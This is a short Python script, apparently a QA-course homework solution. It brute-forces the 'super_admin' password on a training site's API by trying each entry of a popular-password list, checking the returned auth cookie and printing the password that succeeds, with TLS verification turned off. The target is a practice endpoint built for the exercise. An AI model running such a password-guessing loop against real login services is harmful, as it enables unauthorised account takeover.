import requests
get_auth_cookie_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_auth_cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
auth_wrong_answer = "You are NOT authorized"
cookie = {"auth_cookie": ""}
payload = {"login": "super_admin", "password": ""}
file = open('resources/passwords.txt', 'r')
lines = file.read()
popular_passwords = set(lines.splitlines())
file.close()
for password in popular_passwords:
    payload.update({"password": password})
    get_auth_cookie = requests.post(get_auth_cookie_url, data=payload, verify=False)
    auth_cookie = get_auth_cookie.cookies["auth_cookie"]
    cookie.update({"auth_cookie": auth_cookie})
    check_auth_cookie = requests.get(check_auth_cookie_url, cookies=cookie, verify=False)
    check_auth_text = check_auth_cookie.text
    if check_auth_text != auth_wrong_answer:
        print(f"{check_auth_text} Пароль: {password}")
        break
